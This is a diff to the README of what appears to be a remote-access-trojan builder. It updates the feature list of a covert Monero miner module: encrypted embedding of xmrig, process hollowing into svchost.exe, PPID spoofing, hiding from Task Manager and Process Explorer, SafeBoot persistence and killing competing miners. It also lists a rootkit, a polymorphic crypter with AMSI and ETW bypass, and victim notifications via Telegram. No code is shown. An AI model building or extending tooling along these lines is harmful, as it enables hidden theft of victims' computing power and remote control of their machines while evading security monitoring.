@@ -73,7 +73,7 @@ Configure and build the client stub from the **Builder** tab.
 | AutoTask Plugins | ✅ | C++ DLL plugins compiled and executed on-demand |
 | Rootkit (hook DLL) | ✅ | Reflective DLL: `NtQuerySystemInformation` / `NtQueryDirectoryFile` hooks |
 | Polymorphic Crypter | ✅ | Per-build AES-256-CBC, LZNT1, AMSI+ETW bypass *(closed-source)* |
-| XMR Miner | ✅ | NativeAOT miner stub, native TLS (OpenSSL), idle throttle, hollowing, watchdog |
+| XMR Miner | ✅ | NativeAOT miner stub, SFC64+Deflate packing, in-memory OpenSSL detection, native TLS via CLI args, svchost hollowing, PPID spoof, idle throttle, BotKiller, watchdog |
 | Multi-client | ✅ | Tags, per-session logs, HWID deduplication, geo-IP |
 | Telegram Notify | ✅ | First-exec notification, HWID dedup, connection counter |
 
@@ -363,14 +363,17 @@ The builder generates a **polymorphic native C++ loader** that encrypts and laun
 Standalone Monero mining module, fully separate from the main RAT stub.
 
 **Features:**
-- Embeds and XOR-encrypts xmrig at build time (Deflate + XOR, random key per build)
-- **Native TLS** — detects OpenSSL in xmrig at runtime → uses `"tls": true` directly; falls back to loopback TLS-terminating proxy for builds without OpenSSL
-- **Process hollowing** — xmrig runs inside a legitimate process (`svchost.exe`)
-- **Idle throttle** — CPU usage drops when user activity detected
-- **Stealth** — hides from Process Explorer, Task Manager, etc.
-- **Watchdog** — named event + fallback kill+restart loop
-- **SafeBoot persistence** — optional service registered in SafeBoot keys
+- Embeds xmrig at build time — SFC64 stream cipher + Deflate compression (random seed per build)
+- **Native TLS** — scans xmrig in memory for the OpenSSL marker at runtime; if found, passes `--tls` directly on the command line (no proxy, no config file); falls back to a loopback TLS-terminating proxy for builds without OpenSSL
+- **CLI-arg launch** — all pool parameters (`-o`, `-u`, `-p`, `-a`, `--tls`, `--randomx-no-rdmsr`) are passed on the command line; no `config.json` dependency for the pool connection
+- **Process hollowing** — xmrig runs inside a legitimate `svchost.exe` via NtCreateSection/NtMapViewOfSection; no xmrig file touches disk during mining
+- **PPID spoofing** — hollowed process appears as a child of `explorer.exe`
+- **Idle throttle** — full CPU when idle, drops to active limit when user is at the machine
+- **Stealth** — kills hollowed xmrig if Process Explorer / Task Manager / Process Hacker is detected; restarts cleanly when they close
+- **Watchdog** — in-process file integrity watchdog (FileSystemWatcher + polling), backup copy, named-event clean exit; persistence restore only runs when `EnableStartup=true`
+- **SafeBoot persistence** — optional service registered in SafeBoot registry keys
 - **Stats server** — optional lightweight HTTP dashboard (token-protected)
+- **BotKiller** — kills competing miners on startup and every 30 s
 
 **Setup:** place `xmrig.exe` (with OpenSSL) in `xmrig-release/` before building.
 
